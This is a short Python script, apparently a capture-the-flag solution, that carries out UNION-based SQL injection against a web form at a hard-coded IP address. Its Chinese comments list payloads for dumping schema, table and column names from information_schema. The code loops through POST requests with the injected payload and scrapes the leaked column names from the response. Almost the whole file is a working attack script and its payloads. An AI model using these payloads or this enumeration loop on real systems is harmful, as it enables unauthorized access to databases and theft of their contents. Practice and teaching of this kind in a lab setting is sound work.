#coding:utf-8

'''
    暴库
    'union select (select schema_name from information_schema.schemata limit 1,1 ),1,1#
    报表
    'union select (select table_name from information_schema.tables limit 1,1),1,1#
    报字段：这样简单些
    id=-1' union select 1,2,3, group_concat(column_name) from information_schema.columns where table_name=0x666c3467#爆字段
'''
#报字段
import requests
import re
url='http://120.24.86.145:8002/chengjidan/'
data = {'pwd':11111}
content = requests.post(url,data=data)
content.encoding='utf-8'
patch=content.text
for i in range(1,500):
    data = {'id':"'union select (select column_NAME from information_schema.columns limit %d,1),1,1,1#"%i}
    content = requests.post(url,data=data)
    content.encoding='utf-8'
    html=content.text
    html=re.findall(r'<caption>(.*?)</caption>',html,re.S)
    if len(html)>0:
        print "id:",i
        print html[0][:-4]